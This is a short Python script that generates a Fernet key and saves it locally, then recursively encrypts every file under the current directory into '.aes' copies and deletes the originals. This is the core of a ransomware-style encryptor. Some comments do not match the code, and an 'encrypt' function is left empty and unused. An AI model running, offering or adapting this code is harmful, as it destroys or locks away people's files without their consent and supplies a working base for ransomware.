from cryptography.fernet import Fernet
import glob
import os

currentdirectory = os.getcwd()   # Get current directory

def write_key():  #generate encryption key
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():   #loads the encryption key
    return open("key.key", "rb").read()

def encrypt(filename, key):  #encrypts all files, here key represents bytes
    f = Fernet(key)

write_key() # load the previously generated key

key = load_key()  # initialize the Fernet class

f = Fernet(key)   #file_list = os.listdir(currentdirectory)

print('\n Beginning recursive encryption...\n\n')

for x in glob.glob(currentdirectory +'/**/*/*', recursive=True):    # Main loop to encrypt all files recursively
# now the loop ignore the root folder of where it is

    fullpath = os.path.join(currentdirectory, x)
    fullnewf = os.path.join(currentdirectory, x + '.aes')
    # Encrypt
    if os.path.isfile(fullpath):
        print('>>> Original: \t' + fullpath + '')
        print('>>> Encrypted: \t' + fullnewf + '\n')
        with open(fullpath, "rb") as file:             # read all file data
            file_data = file.read()
       
        encrypted_data = f.encrypt(file_data)  # encrypt data

        with open(fullnewf, "wb") as file:  # write the encrypted file
            file.write(encrypted_data)

        os.remove(fullpath)  #removes the old file
